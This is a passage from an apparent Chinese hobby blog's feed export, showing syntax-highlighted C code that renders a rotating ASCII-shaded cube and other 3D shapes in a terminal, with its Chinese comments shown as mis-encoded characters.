class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                                ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                            inside=<span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(inside)&#123;</span><br><span class="line">                        <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ–¹ç¨‹é˜ˆå€¼æ£€éªŒ</span></span><br><span class="line"><span class="comment">                        if(sx==0)&#123;</span></span><br><span class="line"><span class="comment">                            for(int i=0;i&lt;3&amp;&amp;inside;i++)&#123;</span></span><br><span class="line"><span class="comment">                                double b=(tCenter[1]-y[i==0?1:i==1?0:0])*(x[i==0?2:i==1?2:1]-x[i==0?1:i==1?0:0]);</span></span><br><span class="line"><span class="comment">                                double c=(y[i==0?2:i==1?2:1]-y[i==0?1:i==1?0:0])*(tCenter[0]-x[i==0?1:i==1?0:0]);\</span></span><br><span class="line"><span class="comment">                                double d=b-c;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                        //*/</span></span><br><span class="line">                        <span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                        <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span>&#123;<span class="comment">//æ±‚ä¸‰è§’å½¢å¹³é¢æ–¹ç¨‹ç®—å‡ºç‚¹åˆ°å±å¹•è·ç¦»</span></span><br><span class="line">                            p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                            currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                            <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                                alpha=<span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                                dis[sy][sx]=currentDis;</span><br><span class="line">                                out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="comment">///*è¾“å‡ºåˆ°ç»ˆç«¯</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>,shade[outIndex],shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(<span class="number">15</span>);</span><br><span class="line">        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> æ‘¸é±¼ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Render 3D Object In Terminal</title>
      <link href="2021/04/19/Render3D-ObjectInTerminal/"/>
      <url>2021/04/19/Render3D-ObjectInTerminal/</url>
      
        <content type="html"><![CDATA[<p>é€›bç«™çœ‹åˆ°ä¼šè½¬çš„ç”œç”œåœˆï¼Œæœ‰ç‚¹ä¸Šå¤´ï¼Œè‡ªå·±æ‹¿èœ¥è¯­è¨€åšä¸ªç«‹æ–¹ä½“ç©ç©</p><img src="/images/å›¾å½¢å­¦HelloWorld.gif" height="200" width="200" /><span id="more"></span><h1 id="Render-3D-Object-In-Terminal"><a href="#Render-3D-Object-In-Terminal" class="headerlink" title="Render 3D Object In Terminal"></a>Render 3D Object In Terminal</h1><p>ç›´æ¥çœ‹ä»£ç ï¼Œæ³¨é‡Šæ¯”è¾ƒè¯¦ç»†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 51<span class="comment">//è§„å®šå±å¹•å¤§å°</span></span></span><br><span class="line"><span class="comment">////cal_rç”¨æ¥ç®—ä¸ªæ¨¡é•¿</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">cal_r</span><span class="params">(<span class="keyword">float</span> x,<span class="keyword">float</span> y,<span class="keyword">float</span> z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(x*x+y*y+z*z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,;!o*m0&amp;%@&quot;</span>;<span class="comment">//é˜´å½±å­—ç¬¦é›†</span></span><br><span class="line"><span class="keyword">int</span> out_i[size][size];<span class="comment">//è®°å½•äº®åº¦ï¼Œæ˜ å°„åˆ°å­—ç¬¦é›†</span></span><br><span class="line"><span class="keyword">float</span> dyn=<span class="number">4.0</span>;<span class="comment">//å¼€åˆå¹…åº¦</span></span><br><span class="line"><span class="keyword">float</span> a=<span class="number">8.0</span>;<span class="comment">//ç«‹æ–¹ä½“è¾¹é•¿</span></span><br><span class="line"><span class="keyword">float</span> delta=<span class="number">0.75</span>;<span class="comment">//éå†ç«‹æ–¹ä½“çš„æ­¥é•¿</span></span><br><span class="line"><span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//ä»åæ ‡åŸç‚¹åç§»åˆ°å±å¹•ä¸­å¿ƒæ‰€éœ€çš„åç§»é‡</span></span><br><span class="line"><span class="keyword">float</span> dis[size][size];<span class="comment">//è®°å½•æœ€å°è·ç¦»ï¼Œç”±æ­¤åˆ¤æ–­é®ç½©å…³ç³»</span></span><br><span class="line"><span class="comment">//cal_shadeç”¨æ¥ç®—ä¸ªé˜´å½±</span></span><br><span class="line"><span class="comment">//Par&#123;n_iæ˜¯è¢«é€‰ä¸­ç›¸å¯¹ä¸å˜çš„æ–¹å‘,ç›¸å½“äºæ­¤æ–¹å‘ç©¿è¿‡å¹³é¢;n_jä½œä¸ºåˆ¤å®šæ˜¯ä¸Šå¹³é¢è¿˜æ˜¯ä¸‹å¹³é¢çš„å€¼ï¼Œåªå¯èƒ½æ˜¯1æˆ–-1&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal_shade</span><span class="params">(<span class="keyword">float</span> *n,<span class="keyword">int</span> n_i,<span class="keyword">int</span> n_j,<span class="keyword">float</span> *ro_a,<span class="keyword">float</span> *ro_b,<span class="keyword">float</span> *ro_c,<span class="keyword">float</span> *light,<span class="keyword">float</span> rotate,<span class="keyword">int</span> *out_i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)n[i]=i==n_i?n_j:<span class="number">0</span>;<span class="comment">//ç¡®å®šåŸå§‹æ³•å‘é‡n[]</span></span><br><span class="line">    <span class="keyword">float</span> n_a[<span class="number">3</span>]=&#123;n[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">6</span>],</span><br><span class="line">                  n[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">7</span>],</span><br><span class="line">                  n[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">8</span>]&#125;;<span class="comment">//æ³•å‘é‡ç¬¬ä¸€æ¬¡æ—‹è½¬</span></span><br><span class="line">    <span class="keyword">float</span> n_b[<span class="number">3</span>]=&#123;n_a[<span class="number">0</span>]*ro_b[<span class="number">0</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">3</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">6</span>],</span><br><span class="line">                  n_a[<span class="number">0</span>]*ro_b[<span class="number">1</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">4</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">7</span>],</span><br><span class="line">                  n_a[<span class="number">0</span>]*ro_b[<span class="number">2</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">5</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">8</span>]&#125;;<span class="comment">//æ³•å‘é‡ç¬¬äºŒæ¬¡æ—‹è½¬</span></span><br><span class="line">    <span class="keyword">float</span> n_r[<span class="number">3</span>]=&#123;n_b[<span class="number">0</span>]*ro_c[<span class="number">0</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">3</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">6</span>],</span><br><span class="line">                  n_b[<span class="number">0</span>]*ro_c[<span class="number">1</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">4</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">7</span>],</span><br><span class="line">                  n_b[<span class="number">0</span>]*ro_c[<span class="number">2</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">5</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">8</span>]&#125;;</span><br><span class="line">    <span class="comment">//n_r[]ä½œä¸ºç»•ä¸‰è½´æ—‹è½¬rotateè§’åº¦åçš„æ³•å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> result=(n_r[<span class="number">0</span>]*light[<span class="number">0</span>]+n_r[<span class="number">1</span>]*light[<span class="number">1</span>]+n_r[<span class="number">2</span>]*light[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;<span class="comment">//ç‚¹ç§¯æ±‚åå…‰å¼ºåº¦(äº®åº¦)ï¼Œå¹¶æ˜ å°„åˆ°[0,1]</span></span><br><span class="line">    <span class="keyword">float</span> co[<span class="number">3</span>];<span class="comment">//æ­£æ–¹ä½“çš„åŸå§‹åæ ‡ï¼Œcoæ„ä¸ºcoordinate</span></span><br><span class="line">    co[n_i]=dyn*<span class="built_in">cos</span>(rotate*<span class="number">2</span>);<span class="comment">//make it 20% cooler</span></span><br><span class="line">    <span class="keyword">int</span> co_a=n_i==<span class="number">0</span>?<span class="number">1</span>:n_i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> co_b=n_i==<span class="number">0</span>?<span class="number">2</span>:n_i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;<span class="comment">//ç¡®å®šäº†indexä¸ºn_içš„åæ ‡æ˜¯ä¸éœ€è¦è¢«éå†çš„</span></span><br><span class="line">    co[n_i]+=move/<span class="number">2</span>;<span class="comment">//æ— éœ€éå†çš„æ–¹å‘åç§»1/4ä¸ªå±å¹•è¾¹é•¿</span></span><br><span class="line">    <span class="keyword">for</span>(co[co_a]=-a;co[co_a]&lt;=a;co[co_a]+=delta)</span><br><span class="line">        <span class="keyword">for</span>(co[co_b]=-a;co[co_b]&lt;=a;co[co_b]+=delta)&#123;</span><br><span class="line">            <span class="keyword">int</span> <span class="keyword">final</span>=(<span class="keyword">int</span>)(result*<span class="number">10.0</span>);<span class="comment">//æŠŠäº®åº¦intåŒ–</span></span><br><span class="line">            <span class="keyword">final</span>=(<span class="keyword">final</span>&gt;<span class="number">10</span>||<span class="keyword">final</span>)&lt;<span class="number">0</span>?<span class="keyword">final</span>&gt;<span class="number">10</span>?<span class="number">10</span>:<span class="number">0</span>:<span class="keyword">final</span>;<span class="comment">//ä¿é™©ï¼Œé˜²æ­¢ä¸€äº›åˆé’»æƒ…å†µ</span></span><br><span class="line">            <span class="keyword">float</span> x_a=co[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_a=co[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_a=co[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">8</span>];<span class="comment">//åæ ‡ç¬¬ä¸€æ¬¡æ—‹è½¬</span></span><br><span class="line">            <span class="keyword">float</span> x_b=x_a*ro_b[<span class="number">0</span>]+y_a*ro_b[<span class="number">3</span>]+z_a*ro_b[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_b=x_a*ro_b[<span class="number">1</span>]+y_a*ro_b[<span class="number">4</span>]+z_a*ro_b[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_b=x_a*ro_b[<span class="number">2</span>]+y_a*ro_b[<span class="number">5</span>]+z_a*ro_b[<span class="number">8</span>];<span class="comment">//åæ ‡ç¬¬äºŒæ¬¡æ—‹è½¬</span></span><br><span class="line">            <span class="keyword">float</span> x_r=x_b*ro_c[<span class="number">0</span>]+y_b*ro_c[<span class="number">3</span>]+z_b*ro_c[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_r=x_b*ro_c[<span class="number">1</span>]+y_b*ro_c[<span class="number">4</span>]+z_b*ro_c[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_r=x_b*ro_c[<span class="number">2</span>]+y_b*ro_c[<span class="number">5</span>]+z_b*ro_c[<span class="number">8</span>];</span><br><span class="line">            <span class="comment">//co_rä½œä¸ºç»•ä¸‰è½´æ—‹è½¬rotateè§’åº¦åçš„ç©ºé—´åæ ‡</span></span><br><span class="line">            <span class="keyword">int</span> cox=(<span class="keyword">int</span>)(n_j*x_r+move);</span><br><span class="line">            <span class="keyword">int</span> coy=(<span class="keyword">int</span>)(n_j*z_r+move);<span class="comment">//æ‰¾åˆ°æŠ•å½±åˆ°å±å¹•ä¸Šçš„ç‚¹åœ¨å“ª</span></span><br><span class="line">            <span class="keyword">if</span>(n_j*y_r&lt;dis[cox][coy])&#123;<span class="comment">//åªæœ‰å‘ç°æ›´è¿‘çš„ç‚¹æ‰æ›¿æ¢äº®åº¦</span></span><br><span class="line">                out_i[cox*size+coy]=<span class="keyword">final</span>;</span><br><span class="line">                dis[cox][coy]=n_j*y_r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> n[<span class="number">3</span>];<span class="comment">//åŸå§‹æ³•å‘é‡n[]</span></span><br><span class="line">    <span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;<span class="comment">//å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> length=cal_r(light[<span class="number">0</span>],light[<span class="number">1</span>],light[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)light[i]/=length;<span class="comment">//å•ä½åŒ–å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;<span class="comment">//rotateä¸ºæ—‹è½¬è§’åº¦ï¼Œå¢é‡å³æ—‹è½¬é€Ÿåº¦</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">4.0</span>*size);</span><br><span class="line">                <span class="comment">//åˆå§‹åŒ–äº®åº¦ä¸è·ç¦»</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">float</span> cos_ro=<span class="built_in">cos</span>(rotate),sin_ro=<span class="built_in">sin</span>(rotate);</span><br><span class="line">        <span class="keyword">float</span> ro_a[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,cos_ro,-sin_ro&#125;,&#123;<span class="number">0</span>,sin_ro,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_b[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,<span class="number">0</span>,sin_ro&#125;,&#123;<span class="number">0</span>,<span class="number">1.0</span>,<span class="number">0</span>&#125;,&#123;-sin_ro,<span class="number">0</span>,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_c[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,-sin_ro,<span class="number">0</span>&#125;,&#123;sin_ro,cos_ro,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1.0</span>&#125;&#125;;</span><br><span class="line">        <span class="comment">//æ—‹è½¬çŸ©é˜µï¼Œroè¡¨rotate</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//ç®—ä¸ªé˜´å½±ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ§åˆ¶å¯¹åº”é¢</span></span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">-1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++) out_i[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">        <span class="comment">//è·Ÿç€ç”œç”œåœˆæŠ„çš„ï¼Œè¿™æ ·æ‰èƒ½ç¨³å®šä½å›¾åƒ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dev C++ä¸‹åˆ™è°ƒç”¨Windows.hæ¥è§£å†³å›¾åƒåˆ·æ–°çš„é—®é¢˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_O</span><span class="params">()</span><span class="comment">//CSDNä¸ŠæŠ„çš„å‡½æ•°ï¼Œåˆ·æ–°ä¸€å¿«å…‰æ ‡å°±é£˜æ¥é£˜å»ï¼Œçœ‹èµ·æ¥åƒå™ªç‚¹ä¸€æ ·</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hOut;</span><br><span class="line">    hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld.gif"></p><p>æœ€å¼€å§‹å…ˆå†™äº†ä¸ªå…‰æºç§»åŠ¨çƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 